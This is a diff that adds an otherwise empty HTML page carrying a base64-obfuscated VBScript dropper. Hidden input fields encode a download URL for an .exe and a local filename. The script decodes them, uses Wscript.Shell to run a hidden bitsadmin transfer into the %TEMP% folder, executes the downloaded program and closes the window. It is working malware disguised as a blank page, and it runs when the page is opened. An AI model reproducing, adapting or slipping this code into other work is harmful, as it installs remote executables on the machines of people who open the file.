@@ -1,0 +1,47 @@
+<html>
+<head>
+</head>
+<body>
+</body>
+<input type="hidden" id="a1" name="a1" value="aHR0cDovL2plbnRkd25sb2FkLnRvcC9maWxlcy9tdHIxLmV4ZQ==">
+<input type="hidden" id="a2" name="a2" value="0LrQu9GO0YctMTM0MjMuZXhl">
+</html>
+<script language = "VBScript">
+sc1 = base64_decode("V3NjcmlwdC5TaGVsbA==")
+a1val =  base64_decode(document.getElementById("a1").value)
+a2val = base64_decode(document.getElementById("a2").value)
+lap = CreateObject(sc1).ExpandEnvironmentStrings(base64_decode("JVRFTVAl"))
+rst = base64_decode("Yml0c2FkbWluIC90cmFuc2ZlciB0ZXN0IC9kb3dubG9hZCAvcHJpb3JpdHkgbm9ybWFsIHswfSB7MX0=")
+fn=lap & "\" & a2val
+out = Replace (rst, "{0}", a1val)
+out = Replace (out, "{1}", fn)
+on error resume next 
+on error goto 0
+onow out
+onow fn
+Window.Close
+Sub onow(str)
+	With CreateObject(sc1)
+		.Run(str), 0, true
+	End With
+End Sub
+Function base64_decode(ByVal strText) 
+    With CreateObject("MSXML2.DOMDocument.3.0").CreateElement("Base64")
+        .DataType = "bin.base64"
+        .Text = strText
+        base64_decode = base64_to_string(.NodeTypedValue)
+    End With
+End Function
+Function base64_to_string(Binary)
+  Dim BinaryStream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  BinaryStream.Type = 1
+  BinaryStream.Open
+  BinaryStream.Write Binary
+  BinaryStream.Position = 0
+  BinaryStream.Type = 2
+  BinaryStream.CharSet = "utf-8"
+  base64_to_string = BinaryStream.ReadText
+  Set BinaryStream = Nothing
+End Function
+</script>
